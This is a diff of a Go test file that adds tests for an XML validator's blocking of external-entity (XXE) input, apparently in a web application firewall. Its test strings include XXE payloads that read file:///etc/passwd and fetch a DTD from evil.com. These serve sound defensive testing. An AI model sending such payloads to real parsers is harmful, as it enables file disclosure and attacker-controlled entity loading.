@@ -190,3 +190,42 @@ func TestAnalyzeXMLCountsBombReferencesPastParseError(t *testing.T) {
 		t.Errorf("entities = %d, want 151 (1 declaration + 150 references)", entities)
 	}
 }
+
+func TestXMLExternalEntities(t *testing.T) {
+	tests := []struct {
+		name    string
+		xml     string
+		blocked bool
+	}{
+		{"external DOCTYPE", `<!DOCTYPE x SYSTEM "//x/x" ><x>a</x>`, true},
+		{"external DOCTYPE with public id", `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html/>`, true},
+		{"entity SYSTEM", `<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, true},
+		{"parameter entity SYSTEM", `<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>`, true},
+		{"parameter entity PUBLIC", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>`, true},
+		{"lower case keywords", `<!doctype x system "//x/x"><x/>`, true},
+		{"internal entity only", `<!DOCTYPE x [<!ENTITY y "text">]><x>&y;</x>`, false},
+		{"plain document", `<?xml version="1.0"?><a><b>hello</b></a>`, false},
+		{"SYSTEM as ordinary text", `<a><b>the SYSTEM is down</b></a>`, false},
+		{"namespaced SOAP", `<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>`, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			d := NewValidator(testCfg()).ValidateXMLBody(context.Background(), []byte(tt.xml))
+			if d.Block != tt.blocked {
+				t.Fatalf("Block = %v, want %v (%+v)", d.Block, tt.blocked, d)
+			}
+			if d.Block && d.Protection != XMLExternalEntity {
+				t.Errorf("Protection = %q, want %q", d.Protection, XMLExternalEntity)
+			}
+		})
+	}
+}
+
+func TestXMLExternalEntitiesLeafCanBeDisabled(t *testing.T) {
+	cfg := testCfg()
+	cfg.Disable[XMLExternalEntity] = true
+	d := NewValidator(cfg).ValidateXMLBody(context.Background(), []byte(`<!DOCTYPE x SYSTEM "//x/x"><x/>`))
+	if d.Block {
+		t.Errorf("blocked with the leaf disabled: %+v", d)
+	}
+}
